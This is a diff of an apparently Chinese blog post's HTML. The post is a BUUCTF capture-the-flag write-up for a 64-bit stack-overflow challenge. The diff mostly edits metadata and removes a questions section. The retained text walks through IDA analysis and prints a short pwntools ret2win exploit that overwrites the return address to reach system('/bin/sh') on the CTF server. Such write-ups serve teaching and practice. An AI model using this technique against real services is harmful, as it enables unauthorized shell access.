@@ -36,9 +36,8 @@
 <meta property="og:image" content="https://pic2.zhimg.com/80/v2-23ce5525745d5b11353c4a0c792f0edd_1440w.webp">
 <meta property="og:image" content="https://pic1.zhimg.com/80/v2-a94f13524837503afef423f2bcea458c_1440w.webp">
 <meta property="og:image" content="https://pic2.zhimg.com/80/v2-8cf32a5f0007c9057c530f3e4be55c6d_1440w.webp">
-<meta property="og:image" content="https://pic4.zhimg.com/80/v2-0a7d690c55ddb11f03cb5dbcf0bc4123_1440w.webp">
 <meta property="article:published_time" content="2023-01-13T13:01:55.000Z">
-<meta property="article:modified_time" content="2023-01-13T13:37:04.321Z">
+<meta property="article:modified_time" content="2023-01-22T10:09:23.029Z">
 <meta property="article:author" content="lmarch2">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="BUUCTF">
@@ -153,7 +152,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#T2-rip"><span class="nav-text">T2 rip</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-checksec"><span class="nav-text">0x01 checksec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-IDA"><span class="nav-text">0x02 IDA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-exp"><span class="nav-text">0x03 exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-small-questions"><span class="nav-text">0x04 small questions</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-%E8%A1%A5%E5%85%85%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86"><span class="nav-text">0x05 补充一些知识</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#T2-rip"><span class="nav-text">T2 rip</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-checksec"><span class="nav-text">0x01 checksec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-IDA"><span class="nav-text">0x02 IDA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-exp"><span class="nav-text">0x03 exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-%E8%A1%A5%E5%85%85%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86"><span class="nav-text">0x04 补充一些知识</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -328,9 +327,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2023-01-13 21:01:55 / 修改时间：21:37:04" itemprop="dateCreated datePublished" datetime="2023-01-13T21:01:55+08:00">2023-01-13</time>
+      <time title="创建时间：2023-01-13 21:01:55" itemprop="dateCreated datePublished" datetime="2023-01-13T21:01:55+08:00">2023-01-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-01-22 18:09:23" itemprop="dateModified" datetime="2023-01-22T18:09:23+08:00">2023-01-22</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -356,7 +361,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>763</span>
+      <span>703</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -382,8 +387,7 @@
 <h3 id="0x01-checksec"><a href="#0x01-checksec" class="headerlink" title="0x01 checksec"></a>0x01 checksec</h3><p>查看保护机制<br><img data-src="https://pic2.zhimg.com/80/v2-58b53c6902894211862d4148de61eaa1_1440w.webp"><br>啥都没开，非常nice</p>
 <h3 id="0x02-IDA"><a href="#0x02-IDA" class="headerlink" title="0x02 IDA"></a>0x02 IDA</h3><p>file后是64位，扔到IDA里<br><img data-src="https://pic4.zhimg.com/80/v2-7006f2599ec061a9ccd9e41370a2c34b_1440w.webp"><br>打开string window,发现有&#x2F;bin&#x2F;sh，双击-》点击command,ctrl+X跳到fun函数里<br><del>Function window直接找也行….</del><br><img data-src="https://pic2.zhimg.com/80/v2-42111c4151f4950164f04d213c23e9bd_1440w.webp"><br>直接f5大法<br>main函数里好像没啥用<br>看到char了一个s数组还有get函数，栈溢出无疑了<br><img data-src="https://pic3.zhimg.com/80/v2-21033c9a0be0c615a751be12c50d7a6a_1440w.webp"><br>fun函数里有system函数，想到把fun函数的地址压进栈的return address里使fun函数得以执行<br>于是找出fun函数中调用system的地址0x40118A<br><img data-src="https://pic2.zhimg.com/80/v2-23ce5525745d5b11353c4a0c792f0edd_1440w.webp"><br>有了地址，现在需要知道的是s的长度，在IDA中可以找到<br><img data-src="https://pic1.zhimg.com/80/v2-a94f13524837503afef423f2bcea458c_1440w.webp"><br>距离rbp的距离是0Fh，也就是s的内存空间为15字节,当然了，除此之外，还需要8字节的数据将rbp填满，才能让数据溢过Local Variables 和 Caller’s rsp，溢出进入Return Address</p>
 <h3 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h3><p>vim pwn1.py<br><code>#pwn1.py from pwn import * p = remote(&quot;node4 .buuoj.cn&quot;,25026) payload = b&#39;a&#39; * (0xf+8) + p64(0x40118A) p.sendline(payload) p.interactive() </code><br><del>一开始没加b’’然后报错TypeError: can only concatenate str (not “bytes”) to str……</del><br>执行脚本得到flag<br><img data-src="https://pic2.zhimg.com/80/v2-8cf32a5f0007c9057c530f3e4be55c6d_1440w.webp"></p>
-<h3 id="0x04-small-questions"><a href="#0x04-small-questions" class="headerlink" title="0x04 small questions"></a>0x04 small questions</h3><p>1.双击数组s进入的这个窗口是怎么看的<br><img data-src="https://pic4.zhimg.com/80/v2-0a7d690c55ddb11f03cb5dbcf0bc4123_1440w.webp"><br>2.怎么看出来s的内存空间是紧挨着rbp的呢？</p>
-<h3 id="0x05-补充一些知识"><a href="#0x05-补充一些知识" class="headerlink" title="0x05 补充一些知识"></a>0x05 补充一些知识</h3><p>IDA栈帧视窗详细说明：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u012206617/article/details/87717310">这篇文章</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/ComputerInBook/article/details/126840323">这篇文章</a>举了一个例子详细说明</p>
+<h3 id="0x04-补充一些知识"><a href="#0x04-补充一些知识" class="headerlink" title="0x04 补充一些知识"></a>0x04 补充一些知识</h3><p>IDA栈帧视窗详细说明：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u012206617/article/details/87717310">这篇文章</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/ComputerInBook/article/details/126840323">这篇文章</a>举了一个例子详细说明</p>
 
     </div>
 
